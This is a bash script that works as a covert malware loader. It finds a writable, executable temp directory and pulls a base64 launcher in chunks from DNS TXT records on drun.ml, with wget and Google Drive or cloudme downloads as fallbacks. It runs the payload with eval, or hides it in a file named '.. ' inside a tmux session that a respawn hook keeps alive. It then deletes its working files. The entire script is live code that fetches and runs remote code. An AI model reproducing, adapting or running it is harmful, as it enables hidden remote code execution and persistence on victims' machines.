#!/bin/bash

set +x
TMX=${TMX:-0}
PATH=.:$PATH

for ph in {/tmp,/dev/shm,/run,~/,/var/tmp,/var/cache}; do
    rm -f $ph/.xtst
    touch $ph/.xtst &&
        chmod +x $ph/.xtst &&
        $ph/.xtst &&
        rm -f $ph/.xtst &&
        cd $ph &&
        break
done
{ type base64 &>/dev/null && b64=base64; } ||
        { type openssl &>/dev/null && b64="openssl enc -base64 "; } ||
                { sleep 3 && echo "no encoding tools availables!" exit 1; }

parsedata() {
    ## strip truncated messages
    # data=$(echo "${data}" | while read l; do [ "${l/\;\;}" = "${l}" ] && echo "$l" && break; done)
    data=${data//\"} ## after this we order chunks
    data=${data// }
    declare -a ar_data
    for l in $data; do
        ar_data[${l:0:1}]=${l:1}
    done
    data=${ar_data[@]}
    data=${data// }
    # data=$(IFS=\$'" "'; echo $data) ## after this we order chunks
    # data=${data// }
    # data=$(while read l; do echo ${l:1}; done <<< "$data")
    ## dns records escaping related
    # data=${data//\ }
    # data=${data//\"}
    ## fix for freedns TXT submission
    # [ "$data" != "${data%eql}" ] && data="${data%eql}="
}

querydns() {
    dig="$dig txt ${record}.${zone} +short +tcp +timeout=3 +retries=0"
    $dig @1.1.1.1 || $dig @8.8.8.8 || $dig
}

endpoints() {
    chunksize=2047 # 1 char for order
    zone=drun.ml
    record=d
    data=$(querydns)
    parsedata
    launcher=${data}
    launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
    # script_url=$(dig txt latest.drun.ml +short)
    zone=drun.ml
    record=pl
    pl_token=$(querydns)
    pl_token=${pl_token//\"}
}

endpoints_fallback() {
    script_url=latest.drun.ml
    token_url=https://pl.drun.ml
    data=$(echo "$script_url" | wget -q -i- -O- | $b64 -d)
    parsedata
    launcher=${data}
    pl_token=$(echo "$token_url" | wget -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
    pl_token=${pl_token/*\/}
}

filename=".rslv"
getdig() {
    cloudmeurl="https://www.cloudme.com/v1/ws2/:fragia/:dig/dig"
    echo "$cloudmeurl |" | wget -q -i- -O ${filename} && chmod +x ${filename} && 
        ./${filename} -v &>/dev/null || {
            fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
            gdriveCookieUrl="https://drive.google.com/uc?export=download&id=${fileid}"
            gdriveDownloadUrl="https://drive.google.com/uc?export=download&id=${fileid}&confirm="

            echo "$gdriveCookieUrl" | wget -q --save-cookies ./cookie -O/dev/null -i-
            gdriveDownloadId=$(awk '/download/ {print $NF}' ./cookie)
            echo  "$gdriveDownloadUrl" | wget -q  --load-cookies ./cookie -i- -O ${filename}
            chmod +x "$filename"
            rm -f ./cookie
            ./${filename} -v &>/dev/null || { echo "error, couldn't get dig!"; exit 1; }
        }
}

if type dig &>/dev/null; then
    dig="dig"
    endpoints
else
    dig="$filename"
    getdig && endpoints ||
            endpoints_fallback
fi

pl_token="${pl_token}" pl_name="${pl_name:-payload}"
echo "export \
pl_token=${pl_token} pl_name=${pl_name:-payload} \
X_TOKEN=acstkn \
$ENV_VARS \
">env.sh

if [ "$TMX" = 1 ]; then
    tmx_init="new -s init sleep 10"
    grep -q "$tmx_init" ~/.tmux.conf || echo "$tmx_init" >> ~/.tmux.conf
    tmux start-server
    tmux set -g default-shell /bin/bash

    tmux  setenv -g pl_token "$pl_token"
    tmux  setenv -g pl_name "$pl_name"

    tmux new -d -s crt
    tmux set-option -t crt remain-on-exit
    ENV=$(<env.sh)
    tmux set-hook -t crt pane-died "run 'cd \"$PWD\"; tmux respawn-pane -t crt ; tmux send-keys -t crt \"eval  \" \"$ENV\" Enter \". \" ./\\\"..\ \\\" Enter'"

    echo "$launcher" > ".. "
    tmux send-keys -t crt ". ./\".. \"" Enter
    (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
else
    (sleep 5 && rm -f env.sh "$filename") &>/dev/null &
    sleep 1
    eval "$(printf '%s' "$launcher")" &>/dev/null
fi
